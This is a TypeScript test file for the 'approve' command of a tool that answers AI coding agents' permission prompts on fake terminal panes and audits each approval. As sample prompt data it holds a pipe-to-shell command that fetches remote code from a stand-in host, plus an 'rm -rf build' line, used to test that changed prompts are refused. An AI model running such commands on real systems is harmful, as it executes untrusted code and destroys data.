// `bakr <agent> approve <promptId>` end to end against the fake herdr host:
// the real grammar, CLI dispatch, herdr adapter, drovr's approvePermission and
// bakr's own 0600 audit writer. Nothing here reaches a real pane — every
// command a test runs goes to test/support/fake-host.ts and is recorded.
import { afterEach, expect, test } from "bun:test";
import { chmod, mkdir, mkdtemp, readdir, readFile, realpath, rm, stat, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { classifyPermissionPrompt } from "@brooswit/drovr";
import { emptyAgentStore, putAgent, type AgentRecord } from "../../src/agent-model";
import { save as saveAgents } from "../../src/agent-store-io";
import type { ClaimKey } from "../../src/claim-key-resolve";
import { runCli, type CliDeps } from "../../src/cli/main";
import { herdrPermissions } from "../../src/cli/herdr-transport";
import { realAppendPermissionAudit, realOrphanProbeDeps, realResolveInputs } from "../../src/paths";
import { makeFakeHost, permissionScreen, type FakeHost } from "../support/fake-host";

const dirs: string[] = [];
afterEach(async () => { while (dirs.length) await rm(dirs.pop()!, { recursive: true, force: true }); });

/** Everything `approve` may run on a pane: the listing, the screen, the agent it reads for the audit, and the keys. */
const APPROVE_COMMANDS = new Set(["herdr agent list", "herdr agent read", "herdr agent get", "herdr agent send-keys"]);
const isSendKeys = (argv: string[]): boolean => argv[0] === "herdr" && argv[1] === "agent" && argv[2] === "send-keys";

type AgentSpec = { id: string; name: string; sessionId: string; screen?: string; stuck?: boolean; restoreTarget?: "own-pane" | "none" | { shortId: string } };
type SetupOpts = { user?: string | undefined; failListing?: boolean; failSendKeys?: boolean; afterFirstRead?: (host: FakeHost) => void };

/**
 * Agents in one claimed directory, each on its own fake herdr pane. The agent
 * store and the audit live in a SEPARATE state directory, as they do for real
 * (beside agents.json), so a test can prove nothing lands in the claimed one.
 */
async function setup(specs: AgentSpec[], opts: SetupOpts = {}) {
  const root = await realpath(await mkdtemp(join(tmpdir(), "bakr-cli-approve-")));
  const state = await realpath(await mkdtemp(join(tmpdir(), "bakr-cli-approve-state-")));
  dirs.push(root, state);
  const agentsPath = join(state, "agents.json");
  const auditPath = join(state, "bakr", "permission-approvals.jsonl");
  const host = makeFakeHost({ failListing: opts.failListing ?? false });
  const panes = new Map(specs.map((s) => [s.id, host.addPane({ cwd: root, sessionId: s.sessionId, ...(s.screen === undefined ? {} : { screen: s.screen }), ...(s.stuck ? { stuck: true } : {}) })]));
  let store = emptyAgentStore();
  for (const s of specs) {
    const target = s.restoreTarget ?? "own-pane";
    const restoreTarget = target === "none" ? undefined : { sessionId: s.sessionId, shortId: target === "own-pane" ? panes.get(s.id)!.paneId : target.shortId };
    store = putAgent(store, { id: s.id, name: s.name, directory: root as ClaimKey, state: "on", createdAt: 1, birthSessionId: restoreTarget?.sessionId, restoreTarget } as AgentRecord);
  }
  await saveAgents(agentsPath, store);
  const out: string[] = [], err: string[] = [], commands: string[][] = [];
  let reads = 0;
  const runCommand: typeof host.runCommand = async (argv, o) => {
    commands.push(argv);
    if (!APPROVE_COMMANDS.has(argv.slice(0, 3).join(" "))) throw new Error(`approve must not run ${argv.join(" ")}`);
    if (opts.failSendKeys && isSendKeys(argv)) throw new Error("simulated send-keys failure");
    const result = await host.runCommand(argv, o);
    if (argv[2] === "read" && ++reads === 1) opts.afterFirstRead?.(host);
    return result;
  };
  // drovr's clock and wait, so verifying a prompt cleared costs no real time.
  let clock = Date.parse("2026-09-18T12:00:00.000Z");
  const deps: CliDeps = {
    actions: { agentsPath, runCommand: async (argv) => { throw new Error(`approve must not run an agent action: ${argv.join(" ")}`); }, now: () => 1, generateAttemptId: () => "x", randomBytes: (n) => new Uint8Array(n) },
    adopt: {} as CliDeps["adopt"], claimsPath: join(state, "claims.json"), resolveInputs: realResolveInputs, probeDeps: realOrphanProbeDeps,
    cwd: root, home: root, stdinIsTTY: false, stdoutIsTTY: false,
    stdout: (s) => { out.push(s); }, stderr: (s) => { err.push(s); },
    prompt: async () => { throw new Error("must not prompt"); }, spawnAttach: async () => { throw new Error("must not attach"); },
    messenger: { message: async () => { throw new Error("must not send"); } },
    permissions: herdrPermissions(runCommand, { appendAudit: realAppendPermissionAudit, now: () => new Date(clock), wait: async (ms) => { clock += ms; }, verifyTimeoutMs: 1000, pollMs: 250 }),
    permissionAuditPath: auditPath,
    ...("user" in opts ? (opts.user === undefined ? {} : { user: opts.user }) : { user: "carol" }),
  };
  const keys = () => commands.filter(isSendKeys).map((c) => c.slice(3));
  const audit = async (): Promise<Record<string, unknown>[]> => (await readFile(auditPath, "utf8")).trimEnd().split("\n").map((line) => JSON.parse(line));
  const auditExists = () => stat(auditPath).then(() => true, () => false);
  return { root, state, auditPath, deps, out, err, commands, host, panes, keys, audit, auditExists };
}

const ALWAYS = "Yes, and always allow access to this directory from this project";
const AUTO = "Yes, and switch to auto mode · auto mode handles these prompts for you";
const request = ["touch notes.txt", "Create an empty notes file"];
const alicePrompt = permissionScreen("Bash command", request);
const bobPrompt = permissionScreen("Write", ["/srv/bob/secrets.env"], ["Yes", "No"]);
const idOf = (screen: string): string => classifyPermissionPrompt(screen)!.promptId;

test("approve once: presses the plain Yes, prints what was approved, and audits approving then approved", async () => {
  const s = await setup([{ id: "@a1", name: "alice", sessionId: "alice-session", screen: alicePrompt }]);
  const pane = s.panes.get("@a1")!;
  expect(await runCli(["alice", "approve", idOf(alicePrompt)], s.deps)).toBe(0);
  expect(pane.answered).toEqual(["Yes"]);
  expect(s.keys()).toEqual([[pane.paneId, "enter"]]);
  const records = await s.audit();
  expect(records.map((r) => r.outcome)).toEqual(["approving", "approved"]);
  expect(s.out.join("")).toBe([
    'approved Bash command for @a1 "alice" (once)',
    "request:",
    "  touch notes.txt",
    "  Create an empty notes file",
    `attempt ${records[0]!.attemptId}, recorded in ${s.auditPath}`,
    "",
  ].join("\n"));
  expect(s.err).toEqual([]);
  for (const r of records) {
    expect(r).toMatchObject({ attemptId: records[0]!.attemptId, operator: "carol", paneId: pane.paneId, sessionId: "alice-session", promptId: idOf(alicePrompt), scope: "once", tool: "Bash command", request: request.join("\n"), option: "Yes" });
  }
  expect((await stat(s.auditPath)).mode & 0o777).toBe(0o600);
});

test("approve --always: presses the stored-rule option, says so, and audits scope always", async () => {
  const s = await setup([{ id: "@a1", name: "alice", sessionId: "alice-session", screen: alicePrompt }]);
  const pane = s.panes.get("@a1")!;
  expect(await runCli(["alice", "approve", idOf(alicePrompt), "--always"], s.deps)).toBe(0);
  expect(pane.answered).toEqual([ALWAYS]);
  expect(s.keys()).toEqual([[pane.paneId, "down", "enter"]]);
  expect(s.out.join("")).toContain('approved Bash command for @a1 "alice" (always: a rule stored for this project, which outlives the session)');
  expect((await s.audit()).map((r) => [r.outcome, r.scope, r.option])).toEqual([["approving", "always", ALWAYS], ["approved", "always", ALWAYS]]);
});

// --always stores a rule that outlives the session, so it must be impossible
// to reach without the flag. The cursor starts ON the always option here, so
// an approve that merely pressed Enter on whatever was highlighted would pick
// it; a default approve must move to the plain Yes instead.
test("--always is never chosen without the flag, even with the cursor already on it", async () => {
  const screen = permissionScreen("Bash command", request, ["Yes", ALWAYS, "No"], 1);
  const s = await setup([{ id: "@a1", name: "alice", sessionId: "alice-session", screen }]);
  expect(await runCli(["alice", "approve", idOf(screen)], s.deps)).toBe(0);
  expect(s.panes.get("@a1")!.answered).toEqual(["Yes"]);
  expect(s.keys()).toEqual([[s.panes.get("@a1")!.paneId, "up", "enter"]]);
  expect((await s.audit()).map((r) => r.scope)).toEqual(["once", "once"]);
});

// drovr's measured four-option dialog. Neither scope may land on auto mode —
// not by default, not with --always, not with the cursor already on it, and
// not as a fallback when there is no always option to choose.
test("the switch-to-auto-mode option is never selected", async () => {
  const measured = ["Yes", ALWAYS, AUTO, "No"];
  for (const [argv, cursor, expected] of [
    [[], 0, "Yes"], [[], 2, "Yes"], [["--always"], 0, ALWAYS], [["--always"], 2, ALWAYS],
  ] as const) {
    const screen = permissionScreen("Bash command", request, measured, cursor);
    const s = await setup([{ id: "@a1", name: "alice", sessionId: "alice-session", screen }]);
    expect(await runCli(["alice", "approve", idOf(screen), ...argv], s.deps)).toBe(0);
    expect(s.panes.get("@a1")!.answered).toEqual([expected]);
  }
  // Auto mode listed BEFORE the stored-rule option, and a dialog whose only
  // "Yes, and …" is auto mode: --always must refuse, never fall back to it.
  const reordered = permissionScreen("Bash command", request, ["Yes", AUTO, ALWAYS, "No"]);
  const s1 = await setup([{ id: "@a1", name: "alice", sessionId: "alice-session", screen: reordered }]);
  expect(await runCli(["alice", "approve", idOf(reordered), "--always"], s1.deps)).toBe(0);
  expect(s1.panes.get("@a1")!.answered).toEqual([ALWAYS]);
  const autoOnly = permissionScreen("Bash command", request, ["Yes", AUTO, "No"]);
  const s2 = await setup([{ id: "@a1", name: "alice", sessionId: "alice-session", screen: autoOnly }]);
  expect(await runCli(["alice", "approve", idOf(autoOnly), "--always"], s2.deps)).toBe(1);
  expect(s2.err.join("")).toMatch(/^option-missing: the prompt offers no option for scope always \(attempt [0-9a-f-]+; not retried\)\n$/);
  expect(s2.keys()).toEqual([]);
  expect(s2.panes.get("@a1")!.answered).toBeUndefined();
  expect((await s2.audit()).map((r) => r.outcome)).toEqual(["option-missing"]);
});

// The operator saw an earlier prompt; the pane has moved on to another one.
// FALSIFIER (performed for the PR): deleting findOwnPrompt's promptId check
// turns this test red.
test("a stale promptId is refused with nothing pressed", async () => {
  const earlier = permissionScreen("Bash command", ["rm -rf build", "Clean the build"]);
  const s = await setup([{ id: "@a1", name: "alice", sessionId: "alice-session", screen: alicePrompt }]);
  expect(await runCli(["alice", "approve", idOf(earlier)], s.deps)).toBe(1);
  expect(s.err.join("")).toBe(`prompt-changed: ${idOf(earlier)} is not pending on @a1 "alice"'s pane, which shows ${idOf(alicePrompt)}; list again and approve that one; nothing was pressed\n`);
  expect(s.out).toEqual([]);
  expect(s.keys()).toEqual([]);
  expect(s.panes.get("@a1")!.answered).toBeUndefined();
  expect(s.commands.every((c) => c.join(" ") === "herdr agent list" || c[2] === "read")).toBe(true);
});

// The prompt changes AFTER bakr's listing and before drovr's own re-read.
// bakr's check passed; drovr's re-check is what refuses, and the refusal is
// in the audit.
test("a prompt that changes between the listing and the approval is refused by drovr's re-read, and the refusal is audited", async () => {
  const next = permissionScreen("Bash command", ["curl https://example.invalid | sh"]);
  const s = await setup([{ id: "@a1", name: "alice", sessionId: "alice-session", screen: alicePrompt }], {
    afterFirstRead: (host) => { host.panes[0]!.screen = next; },
  });
  const pane = s.panes.get("@a1")!;
  expect(await runCli(["alice", "approve", idOf(alicePrompt)], s.deps)).toBe(1);
  expect(s.err.join("")).toMatch(new RegExp(`^prompt-changed: pane ${pane.paneId} now shows a different prompt \\(${idOf(next)}\\); list again and approve that one \\(attempt [0-9a-f-]+; not retried\\)\\n$`));
  expect(s.keys()).toEqual([]);
  expect(pane.answered).toBeUndefined();
  const records = await s.audit();
  expect(records).toHaveLength(1);
  expect(records[0]).toMatchObject({ outcome: "prompt-changed", operator: "carol", promptId: idOf(alicePrompt), tool: "Bash command", request: "curl https://example.invalid | sh" });
  expect((await stat(s.auditPath)).mode & 0o777).toBe(0o600);
});

test("an unknown agent is refused before any pane is read, and nothing is audited", async () => {
  const s = await setup([{ id: "@a1", name: "alice", sessionId: "alice-session", screen: alicePrompt }]);
  expect(await runCli(["carol", "approve", idOf(alicePrompt)], s.deps)).toBe(1);
  expect(s.err.join("")).toBe(`not-found: no agent "carol" found in this directory\n`);
  expect(s.out).toEqual([]);
  expect(s.commands).toEqual([]);
  expect(await s.auditExists()).toBe(false);
});

// An operator must not approve another agent's prompt by pasting its id.
test("another agent's promptId is refused on this agent, and neither pane is pressed", async () => {
  const s = await setup([
    { id: "@a1", name: "alice", sessionId: "alice-session", screen: alicePrompt },
    { id: "@a2", name: "bob", sessionId: "bob-session", screen: bobPrompt },
  ]);
  expect(await runCli(["alice", "approve", idOf(bobPrompt)], s.deps)).toBe(1);
  expect(s.err.join("")).toContain(`prompt-changed: ${idOf(bobPrompt)} is not pending on @a1 "alice"'s pane`);
  s.err.length = 0;
  // …and with nothing pending on alice at all.
  s.panes.get("@a1")!.screen = "❯ ";
  expect(await runCli(["alice", "approve", idOf(bobPrompt)], s.deps)).toBe(1);
  expect(s.err.join("")).toBe(`no-prompt: @a1 "alice"'s pane shows no permission prompt, so ${idOf(bobPrompt)} is not pending there; nothing was pressed\n`);
  expect(s.keys()).toEqual([]);
  expect(s.panes.get("@a2")!.answered).toBeUndefined();
  expect(s.panes.get("@a2")!.screen).toBe(bobPrompt);
  // bob can still approve his own.
  expect(await runCli(["bob", "approve", idOf(bobPrompt)], s.deps)).toBe(0);
  expect(s.panes.get("@a2")!.answered).toEqual(["Yes"]);
});

test("a pane carrying this agent's stale pane id but another session is not approved on its behalf", async () => {
  const s = await setup([
    { id: "@a2", name: "bob", sessionId: "bob-session", screen: bobPrompt },
    { id: "@a1", name: "alice", sessionId: "alice-session", restoreTarget: { shortId: "w1:p1" } },
  ]);
  expect(s.panes.get("@a2")!.paneId).toBe("w1:p1");
  expect(await runCli(["alice", "approve", idOf(bobPrompt)], s.deps)).toBe(1);
  expect(s.keys()).toEqual([]);
  expect(s.panes.get("@a2")!.answered).toBeUndefined();
});

test("the operator defaults to $USER, and --as overrides it", async () => {
  const s = await setup([{ id: "@a1", name: "alice", sessionId: "alice-session", screen: alicePrompt }], { user: "carol" });
  expect(await runCli(["alice", "approve", idOf(alicePrompt), "--as", "usrr:dana"], s.deps)).toBe(0);
  expect((await s.audit()).map((r) => r.operator)).toEqual(["usrr:dana", "usrr:dana"]);
});

test.each([["unset", undefined], ["empty", ""], ["blank", "  "]] as const)("with $USER %s and no --as, approve is a usage error before anything is read or pressed", async (_, user) => {
  const s = await setup([{ id: "@a1", name: "alice", sessionId: "alice-session", screen: alicePrompt }], { user });
  expect(await runCli(["alice", "approve", idOf(alicePrompt)], s.deps)).toBe(2);
  expect(s.err.join("")).toContain("bakr: usage error: approve needs an operator");
  expect(s.err.join("")).toContain("pass --as <operator>");
  expect(s.commands).toEqual([]);
  expect(s.panes.get("@a1")!.answered).toBeUndefined();
  expect(await s.auditExists()).toBe(false);
});

test("keys that leave the prompt on screen are not-cleared: a failure, pressed once, never retried, audited", async () => {
  const s = await setup([{ id: "@a1", name: "alice", sessionId: "alice-session", screen: alicePrompt, stuck: true }]);
  const pane = s.panes.get("@a1")!;
  expect(await runCli(["alice", "approve", idOf(alicePrompt)], s.deps)).toBe(3);
  expect(s.err.join("")).toMatch(new RegExp(`^not-cleared: keys were sent but pane ${pane.paneId} still shows the prompt \\(attempt [0-9a-f-]+; not retried\\)\\n$`));
  expect(s.out).toEqual([]);
  expect(s.keys()).toEqual([[pane.paneId, "enter"]]);
  expect(pane.answered).toEqual(["Yes"]);
  expect((await s.audit()).map((r) => r.outcome)).toEqual(["approving", "not-cleared"]);
});

test("an audit that cannot be written safely is audit-failed: a failure, and nothing is pressed", async () => {
  const s = await setup([{ id: "@a1", name: "alice", sessionId: "alice-session", screen: alicePrompt }]);
  await mkdir(join(s.state, "bakr"));
  await writeFile(s.auditPath, "someone else's\n");
  await chmod(s.auditPath, 0o644);
  expect(await runCli(["alice", "approve", idOf(alicePrompt)], s.deps)).toBe(3);
  expect(s.err.join("")).toMatch(/^audit-failed: audit not written, nothing pressed: .*is mode 0644, wider than 0600.* \(attempt [0-9a-f-]+; not retried\)\n$/);
  expect(s.keys()).toEqual([]);
  expect(s.panes.get("@a1")!.answered).toBeUndefined();
  expect(await readFile(s.auditPath, "utf8")).toBe("someone else's\n");
  expect((await stat(s.auditPath)).mode & 0o777).toBe(0o644);
});

test("a send-keys that throws is reported once, as a failure, and not retried", async () => {
  const s = await setup([{ id: "@a1", name: "alice", sessionId: "alice-session", screen: alicePrompt }], { failSendKeys: true });
  const pane = s.panes.get("@a1")!;
  expect(await runCli(["alice", "approve", idOf(alicePrompt)], s.deps)).toBe(3);
  expect(s.err.join("")).toBe(`approve-failed: simulated send-keys failure; whether a key reached pane ${pane.paneId} is unknown and nothing was retried; \`bakr alice permissions\` shows what is on it now\n`);
  expect(s.commands.filter(isSendKeys)).toHaveLength(1);
  expect((await s.audit()).map((r) => r.outcome)).toEqual(["approving"]);
});

test("an agent that was never launched has no pane to approve on", async () => {
  const s = await setup([{ id: "@a1", name: "alice", sessionId: "alice-session", restoreTarget: "none" }]);
  expect(await runCli(["alice", "approve", "0123456789abcdef"], s.deps)).toBe(1);
  expect(s.err.join("")).toBe(`no-prompt: @a1 "alice" has never been launched, so it has no pane to prompt on; nothing was pressed\n`);
  expect(s.commands).toEqual([]);
});

test("a failed pane listing is a failure, and nothing is pressed", async () => {
  const s = await setup([{ id: "@a1", name: "alice", sessionId: "alice-session", screen: alicePrompt }], { failListing: true });
  expect(await runCli(["alice", "approve", idOf(alicePrompt)], s.deps)).toBe(3);
  expect(s.err.join("")).toContain("listing-failed: cannot read agent @a1's pane: simulated listing failure; nothing was pressed");
  expect(s.keys()).toEqual([]);
});

test("an agent still on legacy `claude --bg` is told why there is nothing to approve", async () => {
  const s = await setup([{ id: "@a1", name: "alice", sessionId: "alice-session", restoreTarget: { shortId: "fullsess" } }]);
  // Its session is on no herdr pane, so no pending prompt is its own.
  s.host.panes.length = 0;
  expect(await runCli(["alice", "approve", "0123456789abcdef"], s.deps)).toBe(1);
  expect(s.err.join("")).toContain("note: agent @a1 still runs under legacy `claude --bg` (fullsess), whose prompts cannot be read or answered");
  expect(s.keys()).toEqual([]);
});

// The audit lives beside agents.json in bakr's state directory; approving
// writes nothing whatsoever inside the agent's claimed directory.
test("approving writes nothing inside the claimed directory", async () => {
  const s = await setup([{ id: "@a1", name: "alice", sessionId: "alice-session", screen: alicePrompt }]);
  const snapshot = async () => {
    const entries = [...(await readdir(s.root, { recursive: true }))].sort();
    return Promise.all(entries.map(async (e) => [e, (await stat(join(s.root, e))).mtimeMs] as const));
  };
  const before = await snapshot();
  const rootMtime = (await stat(s.root)).mtimeMs;
  expect(await runCli(["alice", "approve", idOf(alicePrompt)], s.deps)).toBe(0);
  expect(await snapshot()).toEqual(before);
  expect((await stat(s.root)).mtimeMs).toBe(rootMtime);
  expect(await s.auditExists()).toBe(true);
});
